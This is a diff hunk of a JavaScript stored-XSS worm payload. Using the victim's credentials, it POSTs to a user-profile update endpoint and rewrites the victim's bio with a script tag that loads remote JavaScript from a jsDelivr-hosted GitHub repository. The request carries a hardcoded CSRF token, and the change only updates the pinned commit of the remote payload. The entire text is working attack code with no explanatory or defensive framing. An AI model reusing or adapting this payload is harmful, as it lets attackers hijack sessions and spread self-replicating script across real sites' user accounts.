@@ -22,6 +22,6 @@ xhr.onreadystatechange = function() {
     xhr_2.open('POST', '/api/user/update');
     xhr_2.withCredentials = true;
     xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/gh/qquang/testtttt@60f6f5d/template.js'></script>Title:" + title + "&csrf_token=IjFkNTM3ZjNhYmUxNmQ4ZTU2Mzk0ZDU3YWM0NTcwYmM1YmFlMmJmOWQi.YxhKpQ.5ios6mVWvIhCU1wD8JQFsxeY7WU");
+    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/gh/qquang/testtttt@871769b/template.js'></script>Title:" + title + "&csrf_token=IjFkNTM3ZjNhYmUxNmQ4ZTU2Mzk0ZDU3YWM0NTcwYmM1YmFlMmJmOWQi.YxhKpQ.5ios6mVWvIhCU1wD8JQFsxeY7WU");
 }
 xhr.send();
